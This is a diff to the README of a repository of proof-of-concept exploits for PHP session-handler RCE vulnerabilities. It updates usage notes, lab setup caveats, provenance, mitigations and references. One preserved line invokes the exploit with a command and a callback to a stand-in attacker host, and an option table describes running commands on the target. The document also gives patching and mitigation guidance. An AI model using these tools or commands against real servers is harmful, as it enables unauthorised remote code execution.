@@ -21,6 +21,8 @@ I take no credit for creation of the PoCs. Just thought they would be good to ha
 
 If you run **any** of these PHP versions, you are vulnerable regardless of SAPI (mod_php, PHP-FPM, etc.). No special application code is needed -- the default `index.php` is enough. The exploit tools in this repo target Apache mod_php (prefork MPM) specifically, but the underlying CVEs are in PHP's core session handler.
 
+For a deeper remote probe (no shell access needed), see [`diag_remote.py`](#remote-diagnostic-diag_remotepy) below.
+
 | Branch | Vulnerable | Fixed |
 |---|---|---|
 | PHP 8.2 | 8.2.0 -- 8.2.34 | 8.2.35 |
@@ -47,7 +49,7 @@ If `X-Powered-By` shows a version in the vulnerable range, patch immediately. If
 
 1. **Patch immediately** -- upgrade to PHP 8.2.35, 8.3.36, 8.4.27, or 8.5.12+
 2. **If patching is delayed:**
-   - Disable `session.upload_progress.enabled` in `php.ini` (set to `0`) -- this is the fastest mitigation and breaks nothing unless your application shows upload progress bars
+   - Disable `session.upload_progress.enabled` in `php.ini` (set to `0`) -- this blocks the exploitation path used by both CVEs (the OOM trigger and the stale `PS()` pointer both rely on the upload-progress callback). Breaks nothing unless your application shows upload progress bars. Note: the underlying parser bugs exist independently of this setting; patching is the only complete fix
    - Deploy WAF rules blocking `PHP_SESSION_UPLOAD_PROGRESS` in request bodies
    - Rate-limit concurrent POST connections per source IP
    - Monitor Apache error logs for OOM and segfault patterns (see [Detection](#how-to-detect-exploitation) below)
@@ -268,7 +270,7 @@ python3 phppoc2.py --host <whatever it is> --port <whatever you have, 80 for exa
 | `--host` | 127.0.0.1 | Target host (lab use only; only point at systems you are authorized to test) |
 | `--port` | 18110 | Target port |
 | `--cmd` | `id>/out/p1` | Command to execute |
-| `--proof` | `out/p1` | File to check for RCE proof |
+| `--proof` | `out/p1` | File to check for RCE proof (read locally on the runner's machine; see [Known limitations](#known-limitations) for remote targets) |
 | `--arch` | auto | Architecture (`x86_64` / `aarch64`) |
 | `--workers` | 150 | Worker count (match `MaxRequestWorkers`) |
 | `--retries` | 3 | Retry attempts for each stage |
@@ -303,6 +305,8 @@ python3 phpexploit.py http://target.example.com/ "id" --callback http://attacker
 A target-agnostic diagnostic tool for probing remote servers **without needing shell access or error logs**. It answers the questions that the Apache error log would normally answer: is this prefork? how many workers? does A1 trigger OOM? does the worker survive?
 
 This is useful when you can reach the target over HTTP but cannot read its logs — run it from your own machine before attempting the full exploit to understand what the target will do.
+
+> **Note:** Steps 4-5 (A1 OOM trigger and session probe) invoke `pure/mk_a1.py` and `pure/chunked_send.py`, so the full repo checkout is required — copying `diag_remote.py` alone is not enough. Steps 1-3 (header probe, worker count, worker pinning) use only stdlib sockets.
 
 ```bash
 # Probe a remote target
@@ -343,6 +347,8 @@ python3 diag_remote.py --host 10.0.0.5 --port 80 --max-probe 500
 | `--max-probe` | 300 | Maximum holder connections to try |
 
 ## Lab setup
+
+> **Windows users:** Docker Desktop / WSL2 is **not** a viable lab environment — the exploit's heap geometry was calibrated on native Linux Docker and the address-space layout differs under WSL2's kernel. Use native Linux Docker (bare metal, a real VM, or a cloud instance). See [Known limitations](#known-limitations) for details.
 
 The tested one-command path is `pure/run_pure.sh` (present in this repo). It launches the official `php:8.4.26-apache` image with stock production defaults, mounts `pure/docker/www` as the webroot and `./out` for proof files, and prints the config it verified:
 
@@ -574,7 +580,7 @@ Run `./selftest.sh` after cloning — it compiles every Python file, verifies th
 
 ## Requirements
 
-- Python 3.9+ (standard library only — no third-party packages required)
+- Python 3.9+ (3.9+ for `tuple[...]` type syntax in `phpexploit.py`; standard library only — no third-party packages required)
 - Docker (for lab setup only)
 
 ## Repository layout & provenance
@@ -583,9 +589,9 @@ Everything in `pure/` plus `phppoc2.py` is vendored from [9bie/php2shell-bypass-
 
 | File(s) | Origin |
 |---|---|
-| `phppoc2.py`, `pure/*.py`, `pure/run_pure.sh`, `pure/docker/` | Vendored from 9bie's repo (upstream's entry point `exploit.py` is vendored here as `phppoc2.py` with some changes to make it work better) |
+| `phppoc2.py`, `pure/*.py`, `pure/run_pure.sh`, `pure/docker/` | Vendored from 9bie's repo (upstream's entry point `exploit.py` is vendored here as `phppoc2.py` with some changes to make it work better). Note: `RESEARCH_PURE_128M.md` and other vendored docs reference `exploit.py`, which is upstream's name for what this repo calls `phppoc2.py` |
 | `pure/RESEARCH_PURE_128M.md`, `pure/*.gdb`, `pure/mk_b_min.py`, `pure/mk_flood.py`, `pure/watch_md.sh`, `pure/repro_pure.sh` | Vendored from 9bie's repo — the heap-recalibration kit for other PHP minor versions |
-| `phpexploit.py` | Session poisoning + LFI companion with some minor changes (see its section above) |
+| `phpexploit.py` | Session poisoning + LFI companion, based on the classic `PHP_SESSION_UPLOAD_PROGRESS` technique with minor changes (see its section above). Origin is separate from the 9bie exploit chain |
 | `diag_remote.py` | Original to this repo — target-agnostic remote diagnostic (no shell/log access needed) |
 | `pure/extract_offsets.sh`, `selftest.sh`, `.gitignore` | Original to this repo — lab tooling |
 | `README.md`, `LICENSE` | Original packaging; GPL-3.0 applies to this repo's original files (the upstream vendored code carries no explicit license — the upstream repo is the authoritative source) |
@@ -595,7 +601,7 @@ Local divergence from upstream (kept minimal and deliberate):
 - `phppoc2.py` adds a `--host` flag (default `127.0.0.1`) threaded through to the helpers
 - `phppoc2.py` tries multiple B1 leak-spec layouts per A1 (4 variants with different hole positions/sizes) to improve reliability across ASLR rolls
 - `pure/pwn_pure.py` points at `phppoc2.py` instead of upstream's `exploit.py` filename
-- `phpexploit.py` `try_log_poison()`: fixed unescaped shell metacharacters in the `system()` payload (upstream bug)
+- `phpexploit.py` `poison_payload()` / `try_log_poison()`: added `\` and `'` escaping for the PHP single-quoted `system()` payload (upstream lacked it, so commands containing quotes or backslashes broke the PHP syntax)
 - `pure/decode_cookie.py`, `pure/repro_pure.sh`: widened pointer-range filter to cover both x86_64 and aarch64
 - `pure/watch_md.sh`: added guard for missing `run_a1_probe.sh` dependency
 
@@ -607,7 +613,7 @@ Local divergence from upstream (kept minimal and deliberate):
 
 ## References
 - [php.net security advisory](https://www.php.net/ChangeLog-8.php)
-- [Rapid7 AttackerKB analysis](https://attackerkb.com/) (search for CVE-2026-109618)
+- [Rapid7 AttackerKB analysis](https://attackerkb.com/topics/CVE-2026-109618)
 - [Datadog threat research](https://securitylabs.datadoghq.com/articles/php2shell-critical-vulnerabilities-in-php/)
 - [Calif php2shell research](https://calif.io/php2shell/)
 - [CERT-EU Security Advisory 2026-018](https://cert.europa.eu/publications/security-advisories/2026-018)
